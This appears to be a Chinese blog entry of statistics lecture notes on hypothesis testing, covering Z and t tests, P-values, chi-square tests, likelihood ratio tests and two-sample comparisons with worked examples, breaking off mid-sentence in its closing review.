        <content type="html"><![CDATA[<h1 id="Chap-7-假设检验"><a href="#Chap-7-假设检验" class="headerlink" title="Chap 7 假设检验"></a>Chap 7 假设检验</h1><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><ul><li><p><strong>例(女士品茶)</strong>  某女士声称可区分奶茶是先加牛奶还是先加茶. <strong>R.Fisher</strong> 设计实验: 各有 4 杯奶茶随机排成一排, 将这一信息告知女士. 考虑假设 $H$: 该女士没有区分能力. 当 $H$ 正确的情况下, 4 杯全对的概率为</p><script type="math/tex; mode=display">  \dfrac{C_4^4\cdot C_4^0}{C_8^4}=\dfrac{1}{70}.</script><p>  下述两种情况之一必发生:</p><ul><li>$H$ 不正确 (<strong>i.e.</strong>该女士有区分能力);</li><li><p>$H$ 正确 (发生了一件概率为 $\dfrac{1}{70}$ 的事情).</p><p>通常选择阈值 $\alpha=0.05,0.01,0.1$ (预先给定的显著性水平). 若女士选对了三杯, 则在 $H$ 正确的前提下, 挑对三杯及以上的概率为</p><script type="math/tex; mode=display">\dfrac{C_4^4\cdot C_4^0}{C_8^4}+\dfrac{C_4^3\cdot C_4^1}{C_8^4}=\dfrac{17}{70}\approx 0.243.</script></li></ul></li><li><p><strong>注</strong></p><ul><li><p><strong>Fisher</strong> 显著性检验;</p></li><li><p>若认可某组观测(样本), 则用它来证实或证伪某个理论(断言)具有天然的不对等;</p></li><li><p>$H$ 可以模型化:</p><script type="math/tex; mode=display">  P(X=k)\dfrac{C_4^k\cdot C_4^{4-k}}{C_8^4}.</script></li><li><p>历史注记:</p><ul><li><strong>Fisher</strong> 显著性检验;</li><li><strong>Neyman-Pearson</strong> 检验;</li><li>零假设显著性检验 (<strong>MHST</strong>).</li></ul></li></ul></li><li><p><strong>定义(统计假设)</strong>  对一个或多个总体的某种断言或猜测.</p><ul><li>原假设: 被检验的假设 $H_0$;</li><li>备择假设: 拒绝 $H_0$ 后可供选择的假设 $H_1$.</li><li>若假设可表为参数形式, 那么 $H_0: \theta\in\Theta_0$, $H_1: \theta\in\Theta_1$, 且 $\Theta_0\cap\Theta_1=\varnothing$, $\Theta_0\cup\Theta_1=\theta$ 的所有可能取值之集.</li></ul></li><li><p><strong>例</strong>  假设 $X\sim N(\mu,\sigma^2)$, 其中 $\sigma^2$ 已知.</p><ul><li>$H_0:\mu=\mu_0,\quad H_1:\mu\ne\mu_0$. (双侧假设)</li><li>$H_0:\mu=\mu_0,\quad H_1:\mu&gt;\mu_0$. (单侧假设)</li><li>$H_0:\mu\le\mu_0,\quad H_1:\mu&gt;\mu_0$. (单侧假设)</li><li>$H_0:\mu_1=\mu_2,\quad H_1:\mu_1\ne\mu_2$. (双侧假设)</li></ul></li><li><p><strong>注</strong></p><ul><li>简单假设: 只对应一个总体;</li><li>复合假设: 对应多个总体;</li><li>若 $\sigma^2$ 未知, 则 $H_0: \mu=\mu_0\Leftrightarrow H_0: \mu=\mu_0,\sigma^2$ 任意, 是一个复合假设.</li></ul></li><li><p><strong>定义(假设检验)</strong>  依据样本(观测)的决策(拒绝或不拒绝 $H_0$)过程.</p></li><li><p><strong>定义(检验准则)</strong>  做出决策的一个具体法则.</p></li><li><p><strong>定义(拒绝)</strong>  在原假设 $H_0$ 为真的前提下, 所观测的样本出现的概率如果是很小的, 意味着样本提供的概率拒绝 $H_0$.</p></li><li><p><strong>定义(拒绝域/临界域)</strong>  形式上可抽象为</p><script type="math/tex; mode=display">  R=\{(X_1,\cdots,X_n)\mid T(X_1,\cdots,X_n)\ge c\}.</script><p>  其中 $c$ 被定义为临界值. 此时检验准则为, 若样本 $(X_1,\cdots,X_n)\in R$, 则拒绝假设 $H_0$.</p></li><li><p><strong>定义(显著性检验)</strong>  对事先给定的 $\alpha\in(0,1)$, 若 $P_{\theta}(T(X_1,\cdots,X_n)\ge c)\le\alpha$, $\forall\,\theta\in\Theta_0$, 则称这是一个水平为 $\alpha$ 的显著性检验.</p></li><li><p><strong>例</strong>  假设 $X\sim N(\mu,\sigma^2)$, 其中 $\sigma^2$ 已知, 给定检验水平 $\alpha\in(0,1)$ 和已观测样本 $X_i(1\le i\le n)$. $H_0:\mu=\mu_0$, $H_1:\mu\ne\mu_0$. 对原假设进行检验.</p></li><li><p><strong>解答</strong>  拒绝域为双侧拒绝, 当 $H_0$ 为真时, 控制 $P(\vert\overline{X}-\mu_0\vert\ge c)\le\alpha$. </p><p>  根据 <strong>CLT</strong>, 注意到</p><script type="math/tex; mode=display">  \overline{X}-\mu_0\sim N(0,\dfrac{\sigma^2}{n})\Leftrightarrow\dfrac{\overline{X}-\mu_0}{\tfrac{\sigma}{\sqrt{n}}}\sim N(0,1).</script><p>  取 $\dfrac{c}{\tfrac{\sigma}{\sqrt{n}}}=Z_{\tfrac{\alpha}{2}}\Rightarrow c=\dfrac{\sigma}{\sqrt{n}}\cdot Z_{\tfrac{\alpha}{2}}$. </p><p>  给出在 $\alpha$ 的检验水平下拒绝 $H_0$ 的条件: 若 $\vert\overline{X}-\mu_0\vert\ge\dfrac{\sigma}{\sqrt{n}}\cdot Z_{\tfrac{\alpha}{2}}$, 则拒绝 $H_0$.</p></li><li><p><strong>例</strong>  假设 $X\sim N(\mu,\sigma^2)$, 其中 $\sigma^2$ 已知, 给定检验水平 $\alpha\in(0,1)$ 和已观测样本 $X_i(1\le i\le n)$. $H_0:\mu\ge\mu_0$, $H_1:\mu&lt;\mu_0$. 对原假设进行检验.</p></li><li><p><strong>解答</strong>  拒绝域为单侧拒绝, 当 $H_0$ 为真时, 控制 $P(\overline{X}\le c)\le\alpha$.</p><p>  根据 <strong>CLT</strong>, 注意到</p><script type="math/tex; mode=display">  \overline{X}-\mu\sim N(0,\dfrac{\sigma^2}{n})\Leftrightarrow\dfrac{\overline{X}-\mu}{\tfrac{\sigma}{\sqrt{n}}}\sim N(0,1).</script><p>  因此</p><script type="math/tex; mode=display">  \begin{aligned}  P(\overline{X}\le c)&=P(\dfrac{\overline{X}-\mu}{\tfrac{\sigma}{\sqrt{n}}}\le \dfrac{c-\mu}{\tfrac{\sigma}{\sqrt{n}}})\\  &=P(Z\le\dfrac{c-\mu}{\tfrac{\sigma}{\sqrt{n}}})\\  &=\varPhi(\dfrac{c-\mu}{\tfrac{\sigma}{\sqrt{n}}}),\forall\,\mu\ge\mu_0.  \end{aligned}</script></li></ul><pre><code>取 $\dfrac{c-\mu_0}{\tfrac{\sigma}{\sqrt{n}}}=-Z_{\alpha}\Rightarrow c=\mu_0-\dfrac{\sigma}{\sqrt{n}}\cdot Z_{\alpha}$. 给出在 $\alpha$ 的检验水平下拒绝 $H_0$ 的条件: 若 $\overline{X}\le\mu_0-\dfrac{\sigma}{\sqrt{n}}\cdot Z_{\alpha}$, 则拒绝 $H_0$.</code></pre><ul><li><p><strong>注</strong></p><ul><li><p>这种方法称为 $Z$-检验.</p></li><li><p>若 $\sigma^2$ 未知, 考虑</p><script type="math/tex; mode=display">  \dfrac{\overline{X}-\mu}{\tfrac{S}{\sqrt{n}}}\sim t(n-1).</script><p>  这种方法称为 $t$-检验.</p></li></ul></li></ul><h2 id="Neyman-Pearson-假设检验"><a href="#Neyman-Pearson-假设检验" class="headerlink" title="Neyman-Pearson 假设检验"></a>Neyman-Pearson 假设检验</h2><ul><li><p><strong>定义(错误)</strong>  Ⅰ类错误: 在 $H_0$ 为真时拒绝 $H_0$; Ⅱ类错误: 在 $H_0$ 为假时不拒绝 $H_0$. 对应的概率分别为:</p><script type="math/tex; mode=display">  \begin{aligned}  \alpha(R)&:=P_{\theta}(Ⅰ)=P_{\theta}((X_1,\cdots,X_n)\in R),\theta\in\Theta_0;\\  \beta(R)&:=P_{\theta}(Ⅱ)=P_{\theta}((X_1,\cdots,X_n)\in R^c),\theta\in\Theta_1.  \end{aligned}</script><p>  对于已划分的 $R$ 来说, 是定义域不同的 $\theta$ 的函数.</p></li><li><p><strong>注</strong></p><ul><li>依据样本做决策, 错误不能根本避免;</li><li>一次决策不能同时犯两种错误;</li><li>$n$ 固定, 两种错误发生的概率此消彼长.</li></ul></li><li><p><strong>例(直觉)</strong></p><ul><li>都不拒绝 $H_0$, 那么 $P_{\theta}(Ⅰ)=0$, $P_{\theta}(Ⅱ)=1$.</li><li>考虑事件 $H_0:$ 合格, 事件 $H_1:$ 不合格, 当 $P_{\theta}(Ⅰ)$ 变小时, 不容易拒绝事件, 不合格不容易被检出, 从而 $P_{\theta}(Ⅱ)$ 变大.</li></ul></li><li><p><strong>定义(功效函数)</strong>    给定 $\theta$ 与临界域 $R$, 拒绝原假设 $H_0$ 的概率为:</p><script type="math/tex; mode=display">  P_{\theta}((X_1,\cdots,X_n)\in R)=1-\beta(R),\,\theta\in\Theta_1.</script></li><li><p><strong>定义(Neyman-Pearson 范式)</strong>  $n$ 固定, 控制 $P_{\theta}(Ⅰ)\le\alpha$, 其中 $\alpha$ 为预先给定的检验水平, 再在这个限制下使 $P_{\theta}(Ⅱ)(\theta\in\Theta_1)$ 尽可能小.</p></li><li><p><strong>注</strong></p><ul><li>$\alpha$ 固定时, 使 $P_{\theta}(Ⅱ)(\theta\in\Theta_1)$ 最小的检验称为水平 $\alpha$ 下的一致最优检验;</li><li>原假设 $H_0$ 和备择假设 $H_1$ 一般是地位不对等的:<ul><li>原假设通常是受到保护的, 证据不充分不能拒绝;</li><li>备择假设通常是真正感兴趣的.</li></ul></li><li>一致最优检验不一定存在, 一般也不易求解;</li><li>$\mu_0\in$ 置信区间 $\Leftrightarrow$ 假设检验 $(H_0: \mu=\mu_0, H_1: \mu\ne\mu_0)$ 不拒绝 $H_0$.</li></ul></li></ul><h2 id="假设检验与置信区间"><a href="#假设检验与置信区间" class="headerlink" title="假设检验与置信区间"></a>假设检验与置信区间</h2><ul><li><p><strong>例</strong>  $X\sim N(\mu,\sigma^2)$, $\sigma^2$ 已知, $\alpha&gt;0$ 给定, $X_1,\cdots,X_n$ 为随机样本.</p></li><li><p><strong>解答 </strong> 其双侧置信区间为</p><script type="math/tex; mode=display">  P=(\overline{X}-Z_{\tfrac{\alpha}{2}}\dfrac{\sigma}{\sqrt{n}},\overline{X}+Z_{\tfrac{\alpha}{2}}\dfrac{\sigma}{\sqrt{n}}).</script><p>  考虑假设检验 $H_0:\mu=\mu_0$, $H_1:\mu\ne\mu_0$. 需要控制</p><script type="math/tex; mode=display">  P_{H_0}(\vert\overline{X}-\mu_0\vert\ge c)\le\alpha.</script><p>  检验准则为 $\vert\overline{X}-\mu_0\vert\ge Z_{\tfrac{\alpha}{2}}\dfrac{\sigma}{\sqrt{n}}$ 时拒绝 $H_0$. 我们给出接受域</p><script type="math/tex; mode=display">  R^c=\{(X_1,\cdots,X_n)\mid \vert\overline{X}-\mu_0\vert<Z_{\tfrac{\alpha}{2}}\dfrac{\sigma}{\sqrt{n}}\}\\  =\{(X_1,\cdots,X_n)\mid \mu_0\in P\}.</script><p>  由此可见, $\mu_0\in P\Leftrightarrow$ 用 $\overline{X}$ 为检验统计量, 假设检验不拒绝 $H_0$.(<strong>对偶关系</strong>)</p></li></ul><h2 id="检验的-P-值"><a href="#检验的-P-值" class="headerlink" title="检验的 P 值"></a>检验的 P 值</h2><ul><li><p><strong>定义</strong>  当原假设 $H_0$ 为真时, 检验统计量的观测值以及更极端观测出现的概率. </p></li><li><p><strong>例(选举问题)</strong>  $n=1200$, 调查到的支持比例为 $\tfrac{684}{1200}\approx 0.57$ (观测值).</p></li><li><p><strong>解答</strong>  (1) $H_0:p=p_0$ v.s. $H_1:p&gt;p_0$ ($p_0$ 预先给定).</p><p>  考虑检验统计量 $P_n$, 则由 <strong>CLT</strong>:</p><script type="math/tex; mode=display">  \dfrac{P_n-p}{\sqrt{\tfrac{p(1-p)}{n}}}\stackrel{近似}{\sim}N(0,1).</script><p>  当 $H_0$ 为真时, $p=p_0$, 此时 $se(P_n)=\sqrt{\dfrac{p_0(1-p_0)}{n}}$. 因此 <strong>P</strong> 值</p><script type="math/tex; mode=display">  P_{H_0}(P_n\ge p_n)=P(\dfrac{P_n-p_0}{se(P_n)}\ge\dfrac{p_n-p_0}{se(P_n)})\approx P(Z\ge z_0).</script><p>  其中</p><script type="math/tex; mode=display">  Z\stackrel{近似}{\sim}N(0,1),z_0=\dfrac{p_n-p_0}{se(P_n)}=\dfrac{p_n-p_0}{\sqrt{\tfrac{p_0(1-p_0)}{n}}}.</script><p>  因此</p><script type="math/tex; mode=display">  P_{H_0}(P_n\ge p_n)=1-\varPhi(\dfrac{p_n-p_0}{\sqrt{\tfrac{p_0(1-p_0)}{n}}}).</script><p>  若 $p_0=0.55$, 则 <strong>P</strong> 值 $\approx 0.081$; 若 $p_0=0.5$, 则 <strong>P</strong> 值 $\ll 0.001$.</p><p>  在水平 $\alpha$ 下拒绝 $H_0\Leftrightarrow$ <strong>P</strong> 值 $\le\alpha$.</p></li><li><p><strong>注</strong></p><ul><li><strong>P</strong> 值作为数据 (观测) 拒绝 $H_0$ 的证据.</li><li>强弱的度量: <strong>P</strong> 值越小, 拒绝 $H_0$ 的证据越强 (非正式的).</li><li><strong>P</strong> 值 $\ne$ $P(H_0\mid $ 观测$)$.</li><li>若 <strong>P</strong> 值不小, 则不拒绝 $H_0$, 原因可能为 $H_0$ 真 / $H_0$ 不真, 但检验功效不大.</li></ul></li><li><p><strong>定义</strong>  若拒绝 $H_0:\theta\in\Theta_0\Leftrightarrow T(X_1,\cdots,X_n)\ge C$, 则检验的 <strong>P</strong> 值 $:=$</p><script type="math/tex; mode=display">  \sup_{\theta\in\Theta_0}P_{\theta}(T(X_1,\cdots,X_n)\ge T(x_1,\cdots,x_n)).</script><p>  其中 $T(x_1,\cdots,x_n)$ 为检验统计量的观测值.</p></li><li><p><strong>解答</strong>  (2) $H_0:p\le p_0$ v.s. $H_1:p&gt;p_0$ ($p_0$ 预先给定).</p><p>  考虑检验统计量 $P_n$, 则由 <strong>CLT</strong>:</p><script type="math/tex; mode=display">  \dfrac{P_n-p}{\sqrt{\tfrac{p(1-p)}{n}}}\stackrel{近似}{\sim}N(0,1).</script><p>  当 $H_0$ 为真时, 此时 $se(P_n)\approx \hat{se}(P_n)=\sqrt{\dfrac{p_n(1-p_n)}{n}}$. 因此 <strong>P</strong> 值</p><script type="math/tex; mode=display">  P_{H_0}(P_n\ge p_n)=P(\dfrac{P_n-p}{\hat{se}(P_n)}\ge\dfrac{p_n-p}{\hat{se}(P_n)})\approx P(Z\ge z_0).</script><p>  其中</p><script type="math/tex; mode=display">  Z\stackrel{近似}{\sim}N(0,1),z_0=\dfrac{p_n-p}{\hat{se}(P_n)}=\dfrac{p_n-p}{\sqrt{\tfrac{p_n(1-p_n)}{n}}}.</script><p>  因此</p><script type="math/tex; mode=display">  P_{H_0}(P_n\ge p_n)=1-\varPhi(\dfrac{p_n-p}{\sqrt{\tfrac{p_n(1-p_n)}{n}}}),\forall\,p\le p_0.</script><p>  因此 <strong>P</strong> 值</p><script type="math/tex; mode=display">  \sup_{p\le p_0}\Big(1-\varPhi(\dfrac{p_n-p}{\sqrt{\tfrac{p_n(1-p_n)}{n}}})\Big)=1-\varPhi(\dfrac{p_n-p_0}{\sqrt{\tfrac{p_n(1-p_n)}{n}}}).</script><p>  若 $p_0=0.55$, 则 <strong>P</strong> 值 $\approx 0.081$; 若 $p_0=0.5$, 则 <strong>P</strong> 值 $\ll 0.001$.</p></li></ul><h2 id="拟合优度检验"><a href="#拟合优度检验" class="headerlink" title="拟合优度检验"></a>拟合优度检验</h2><ul><li><p><strong>定义(Pearson 卡方统计量)</strong></p><script type="math/tex; mode=display">  \chi^2:=\sum_{i=1}^{k}\dfrac{(O_i-E_i)^2}{E_i}\stackrel{近似}{\sim}\chi^2(k-1).</script><p>  其中 $O_i$ 为观测频数, $E_i$ 为期望频数 ($H_0$ 真的条件下).</p></li><li><p><strong>定理</strong>  $H_0: P(X\in$ 第 $i$ 单元$)=p_i(1\le i\le k)$. 若 $H_0$ 为真, 当 $n\rightarrow\infty$ 时, 有</p><script type="math/tex; mode=display">  \chi^2\rightarrow\chi^2(k-1).</script></li><li><p><strong>例</strong>  投掷一枚骰子 60 次.</p><p>  | 点数     | 1    | 2    | 3    | 4    | 5    | 6    | 总计 |<br>  | ———— | —— | —— | —— | —— | —— | —— | —— |<br>  | 观测频数 | 4    | 6    | 17   | 16   | 8    | 9    | 60   |<br>  | 期望频数 | 10   | 10   | 10   | 10   | 10   | 10   | 60   |</p><p>  $H_0:$ 分布均匀, $H_1:$ 分布不均匀.</p></li><li><p><strong>解答</strong>  检验统计量的观测值:</p><script type="math/tex; mode=display">  \dfrac{(4-10)^2}{10}+\dfrac{(6-10)^2}{10}+\cdots+\dfrac{(9-10)^2}{10}=14.2.</script><p>  自由度为 $6-1=5$. <strong>P</strong> 值 $=P_{H_0}(\chi^2\ge 14.2)\approx 0.014$.</p></li><li><p><strong>注</strong>  在实际应用中, 需要满足 $E_i=nP_i\ge 5$, 才能较好使用 <strong>Pearson</strong> 定理.</p></li><li><p><strong>例(列联表独立性检验)</strong>  对某项议题态度与年龄段是否独立.</p><p>  |      | 青年 | 中年 | 老年 |      |<br>  | —— | —— | —— | —— | —— |<br>  | 支持 | 20   | 40   | 20   | 80   |<br>  | 反对 | 30   | 30   | 10   | 70   |<br>  |      | 50   | 70   | 30   | 150  |</p><p>  $H_0:$ 独立, $H_1:$ 不独立.</p></li><li><p><strong>解答</strong>  $P_{ij}=P_{i+}P_{+j}$, 其中 $P_{i+}$, $P_{+j}$ 称为边际概率.</p><p>  在 $H_0$ 为真前提下估计 $P_{ij}$. <strong>MLE</strong>:</p><script type="math/tex; mode=display">  P_{ij}^*=(P_{i+}P_{+j})^*=P_{i+}^*P_{+j}^*=\dfrac{sum(row_i)}{n}\times\dfrac{sum(column_j)}{n}.</script><p>  得到</p><script type="math/tex; mode=display">  E_{ij}=nP_{ij}\approx nP_{ij}^*=\dfrac{1}{n}sum(row_i)\times sum(column_j).</script><p>  计算得检验统计量观测值为 6.12, 自由度为 $(a-1)(b-1)=2$.</p><p>  得到 <strong>P</strong> 值 $=P_{H_0}(\chi^2\ge 6.12)\approx 0.0469$.</p></li><li><p><strong>注</strong>  对于 $a$ 行 $b$ 列, 当 $H_0$ 成立时, 其未知参数个数为 $s=(a-1)+(b-1)$.</p><p>  因此卡方自由度为:</p><script type="math/tex; mode=display">  ab-1-s=ab-1-(a-1)-(b-1)=(a-1)(b-1).</script></li></ul><h2 id="似然比检验"><a href="#似然比检验" class="headerlink" title="似然比检验"></a>似然比检验</h2><ul><li><p><strong>例</strong>  两种硬币 ($p=0.5$, $p=0.7$) 投掷 $n=10$ 次, 正面向上 $X=x$ 次. 提出假设 $H_0:p=0.5$ v.s. $p=0.7$. 考虑</p><script type="math/tex; mode=display">  \dfrac{P_{H_0}(X=x)}{P_{H_1}(X=x)}\le c\leftrightarrow x 的范围</script><p>  我们需要控制</p><script type="math/tex; mode=display">  P_{H_0}\Big(似然比\le c\Big)\le\alpha.</script></li><li><p><strong>注</strong></p><ul><li>当 $H_0$, $H_1$ 均为简单假设时 (<strong>N-P</strong>), 证明: 似然比检验最优 (功效最大).</li><li>当 $H_0$, $H_1$ 不全为简单假设时, 似然比检验一般不最优, 但通常表现不错.</li></ul></li><li><p><strong>定义(广义似然比)</strong>  $H_0:\theta\in\Theta_0$ v.s. $H_1:\theta\in\Theta_1$, $X_1,\cdots,X_n$ 为随机样本.</p><p>  考虑广义似然比</p><script type="math/tex; mode=display">  \Lambda^*:=\dfrac{\sup_{\theta\in\Theta_0}L(\theta)}{\sup_{\theta\in\Theta_1}L(\theta)}</script><p>  基于技术原因, 检验统计量选为</p><script type="math/tex; mode=display">  \Lambda:=\dfrac{\sup_{\theta\in\Theta_0}L(\theta)}{\sup_{\theta\in\Theta_0\cup\Theta_1}L(\theta)}=\min\{\Lambda^*,1\}=\Lambda(X_1,\cdots,X_n).</script><p>  $\Lambda$ 越小则越反对 $H_0$ (拒绝域的形状). 选择 $\lambda_0$ 使</p><script type="math/tex; mode=display">  P_{H_0}(\Lambda\le\lambda_0)\le\alpha.</script><p>  至此得到了检验准则.</p></li><li><p><strong>定理</strong>  在一定(光滑性)条件下, 当 $n\rightarrow\infty$ 时, 在 $H_0$ 为真前提下:</p><script type="math/tex; mode=display">  -2\log\Lambda\rightarrow\chi^2(d).</script><p>  其中自由度 $d=\dim(\Theta_0\cup\Theta_1)-\dim(\Theta_0)$. 这里的 $\dim$ 指自由参数的个数.</p></li><li><p><strong>例(多项分布检验)</strong>  $H_0:p_1=p_1^<em>$, $\cdots$, $p_k=p_k^</em>$, 观测频数分别为 $n_1,\cdots,n_k$.</p></li><li><p><strong>解答</strong>  得到</p><script type="math/tex; mode=display">  L(p_1,\cdots,p_k)=C_n^{n_1,\cdots,c_k}p_1^{n_1}\cdots p_k^{n_k}.</script><p>  因此</p><script type="math/tex; mode=display">  \Lambda=\dfrac{\sup_{\theta\in\Theta_0}L(\theta)}{\sup_{\theta\in\Theta_0\cup\Theta_1}L(\theta)}=\dfrac{L(p_1^0,\cdots,p_k^0)}{L(p_1^*,\cdots,p_k^*)}.</script><p>  已知</p><script type="math/tex; mode=display">  n_i=np_i^*,E_i=np_i^0,O_i=n_i.</script><p>  且</p><script type="math/tex; mode=display">  x\log\dfrac{x}{x_0}\stackrel{Taylor}{=}0+(x-x_0)+\dfrac{1}{2}\dfrac{(x-x_0)^2}{x_0}+\cdots</script><p>  计算得</p><script type="math/tex; mode=display">  \begin{aligned}  -2\log\Lambda&=-2\sum_{i=1}^{k}\log\big(\dfrac{p_i^0}{p_i^*}\big)^{n_i}\\  &=-2\sum_{i=1}^{k}n_i\log\dfrac{p_i^0}{p_i^*}\\  &=2\sum_{i=1}^{k}O_i\log\dfrac{O_i}{E_i}\\  &=\sum_{i=1}^{k}\dfrac{(O_i-E_i)^2}{E_i}+\cdots.  \end{aligned}</script><p>  考虑到 $\dim(\Theta_0)=0$, $\dim(\Theta_0\cup\Theta_1)=k-1$, 因此给出</p><script type="math/tex; mode=display">  \sum_{i=1}^{k}\dfrac{(O_i-E_i)^2}{E_i}\stackrel{近似}{\sim}\chi^2(k-1).</script></li></ul><h2 id="两独立总体比较"><a href="#两独立总体比较" class="headerlink" title="两独立总体比较"></a>两独立总体比较</h2><ul><li><p>两独立总体:</p><p>  | 总体 | 均值    | 方差         | 样本 (iid)       |<br>  | —— | ———- | —————— | ———————— |<br>  | $X$  | $\mu_1$ | $\sigma_1^2$ | $X_1,\cdots,X_n$ |<br>  | $Y$  | $\mu_2$ | $\sigma_2^2$ | $Y_1,\cdots,Y_m$ |</p></li><li><p><strong>定义(比较均值)</strong>:</p><p>  给出 $E(\overline{X}-\overline{Y})=\mu_1-\mu_2$, $Var(\overline{X}-\overline{Y})=\dfrac{\sigma_1^2}{n}+\dfrac{\sigma_2^2}{m}=se^2$. 参考置信区间部分.</p></li><li><p><strong>定理</strong>  给出 $W_1\sim\chi^2(k_1)$, $W_2\sim\chi^2(k_2)$, 且 $W_1,W_2$ 独立, 我们有</p><script type="math/tex; mode=display">  \dfrac{W_1/k_1}{W_2/k_2}\sim F(k_1,k_2).</script></li><li><p><strong>定义(比较方差)</strong>: 假设 $X$, $Y$ 均为正态. 提出假设 $H_0:\sigma_1^2=\sigma_2^2$ v.s. $H_1:\sigma_1^2\ne\sigma_2^2$.</p><script type="math/tex; mode=display">  \dfrac{(n-1)S_1^2}{\sigma_1^2}\sim\chi^2(n-1), \dfrac{(m-1)S_2^2}{\sigma_2^2}\sim\chi^2(m-1).</script><p>  考虑检验统计量(依赖于<strong>样本</strong>或<strong>已知参数</strong>)</p><script type="math/tex; mode=display">  \dfrac{S_1^2}{S_2^2}.</script><p>  当 $H_0$ 为真时, 有</p><script type="math/tex; mode=display">  \dfrac{S_1^2}{S_2^2}\sim F(n-1,m-1).</script><p>  检验准则为当</p><script type="math/tex; mode=display">  \dfrac{S_1^2}{S_2^2}\ge F_{\tfrac{\alpha}{2}}(n-1,m-1)\,或\,\dfrac{S_1^2}{S_2^2}\le F_{1-\tfrac{\alpha}{2}}(n-1,m-1)</script><p>  时拒绝原假设.</p></li><li><p><strong>注</strong>  由定义 $F_{1-\tfrac{\alpha}{2}}(n-1,m-1)=\dfrac{1}{F_{\tfrac{\alpha}{2}}(m-1,n-1)}$.</p></li><li><p><strong>例(比较成功率/失败率)</strong>  阿司匹林对降低心脏病发病率的有效性.</p><p>  |          | 心脏病发作 | 心脏病未发作 | 合计  | 发作率 |<br>  | ———— | ————— | —————— | ——- | ——— |<br>  | 阿司匹林 | 139        | 10898        | 11037 | 0.0126 |<br>  | 安慰剂   | 239        | 10795        | 11034 | 0.0217 |</p><p>  提出假设 $H_0:p_1=p_2$ (无效) v.s. $H_1:p_1&lt;p_2$ (有效), 检验统计量为 $P_1-P_2$.</p><p>  容易得到 $E(P_1-P_2)=p_1-p_2$, $Var(P_1-P_2)=\dfrac{p_1(1-p_1)}{n_1}+\dfrac{p_2(1-p_2)}{n_2}$.</p><p>  那么</p><script type="math/tex; mode=display">  \dfrac{(P_1-P_2)-(p_1-p_2)}{se}\stackrel{近似}{\sim}N(0,1).</script><p>  在 $H_0$ 为真前提下, 有</p><script type="math/tex; mode=display">  se^2=p(1-p)(\dfrac{1}{n_1}+\dfrac{1}{n_2})\approx p^*(1-p^*)(\dfrac{1}{n_1}+\dfrac{1}{n_2}).</script><p>  其中 $p^<em>=\dfrac{k_1+k_2}{n_1+n_2}$, 得 $se^2\approx\hat{se}^2=0.00175^2$. 结合 $\dfrac{P_1-P_2}{\hat{se}}\stackrel{近似}{\sim}N(0,1)$, 得 <em>*P</em></em> 值</p><script type="math/tex; mode=display">  P\Big(\dfrac{P_1-P_2}{\hat{se}}\le\dfrac{0.0126-0.0217}{0.00175}\Big)\approx P(Z\le -5.20)\approx 10^{-7}.</script><p>  因此有理由拒绝 $H_0$.</p></li><li><p><strong>注</strong></p><ul><li>随机分组.</li><li>双盲实验.</li><li>$n$ 充分大.</li></ul></li><li><p><strong>例(行驶里程)</strong>  比较两种油 <strong>A</strong> 与 <strong>B</strong> 的行驶里程.</p><p>  |          | 样本容量 | 平均里程 | 样本标准差 |<br>  | ———— | ———— | ———— | ————— |<br>  | 油 <strong>A</strong> | 50       | 25       | 5.00       |<br>  | 油 <strong>B</strong> | 50       | 26       | 4.00       |</p><p>  提出假设 $H_0:\mu_A=\mu_B$ v.s. $H_1:\mu_A\ne\mu_B$, 检验统计量为 $\overline{X}_A-\overline{X}_B$.</p><p>  在 $H_0$ 为真前提下, 有</p><script type="math/tex; mode=display">  \dfrac{\overline{X}_A-\overline{X}_B}{\sqrt{\tfrac{S_1^2}{n_1}+\tfrac{S_2^2}{n_2}}}\sim N(0,1).</script><p>  其中 $\hat{se}\approx 0.905$. 得 <strong>P</strong> 值</p><script type="math/tex; mode=display">  P\Big(\vert\dfrac{\overline{X}_A-\overline{X}_B}{\hat{se}}\vert\ge\vert\dfrac{25-26}{0.905}\vert\Big)\approx P(\vert Z\vert\ge 1.1)\approx 0.2714.</script><p>  认为哪种油行驶里程更长的理由均不充分.</p></li></ul><h2 id="两相关总体比较"><a href="#两相关总体比较" class="headerlink" title="两相关总体比较"></a>两相关总体比较</h2><ul><li><p><strong>例(行驶里程-改进)</strong>  同一辆车不同日子加不同油, 记录行驶里程.</p><p>  | 车号     | 油 A     | 油 B     | 差异 ($d_i$) |<br>  | ———— | ———— | ———— | —————— |<br>  | 1        | 27.01    | 26.95    | 0.06         |<br>  | 2        | 20.00    | 20.44    | -0.44        |<br>  | $\cdots$ | $\cdots$ | $\cdots$ | $\cdots$     |<br>  | 10       | 25.22    | 26.01    | -0.79        |<br>  | 均值     | 25.20    | 25.80    | -0.60        |<br>  | 标准差   | 4.27     | 4.10     | 0.61         |</p><p>  提出假设 $H_0:\mu_d=0$ v.s. $H_1:\mu_d\ne 0$, 检验统计量为 $\overline{d}$.</p><p>  假设 $d_i$ 服从正态分布. 在 $H_0$ 为真前提下, 有</p><script type="math/tex; mode=display">  \dfrac{\overline{d}}{\tfrac{S_d}{\sqrt{n}}}\sim t(n-1).</script><p>  得 <strong>P</strong> 值</p><script type="math/tex; mode=display">  P\Big(\vert t(9)\vert\ge\vert\dfrac{-0.60}{\tfrac{0.61}{\sqrt{10}}}\vert\Big)\approx 0.012.</script><p>  有理由拒绝 $H_0$, 两种油的行驶里程有差距.</p></li><li><p><strong>注</strong>  假设检验不能检验试验设计, 仅对数据负责; 功能有限, 作为决策辅助.</p></li></ul><h2 id="Bayes-假设检验"><a href="#Bayes-假设检验" class="headerlink" title="Bayes 假设检验"></a>Bayes 假设检验</h2><ul><li><p><strong>例</strong>  两种硬币 ($p=0.5$, $p=0.7$) 投掷 $n=10$ 次, 正面向上 $X=x$ 次. 提出假设 $H_0:p=0.5$ v.s. $p=0.7$​. 考虑</p><script type="math/tex; mode=display">  \dfrac{P(H_0\mid x)}{P(H_1\mid x)}=\dfrac{P(H_0)P(x\mid H_0)}{P(H_1)P(x\mid H_1)}<1</script><p>  则拒绝 $H_0$.</p></li><li><p><strong>注</strong>  给出一个特别的例子, $H_0:\theta=\theta_0$, $\Theta$ 连续. 则 $P(H_0\mid x)=0$, 此时似乎总是会拒绝 $H_0$? (陈书 <strong>Chap 5.28</strong>)</p></li></ul><h2 id="Review"><a href="#Review" class="headerlink" title="Review"></a>Review</h2><h3 id="决策"><a href="#决策" class="headerlink" title="决策"></a>决策</h3><ul><li>拒绝 $H_0$ 或不拒绝 $H_0$.</li><li>检验=决策准则 $\Leftrightarrow$ 拒绝域 $R$ 的划分.</li><li>关键:<ul><li>选择合适的检验统计量.</li><li>确定拒绝域的形状 (由 $H_1$ 决定).</li></ul></li><li>拒绝 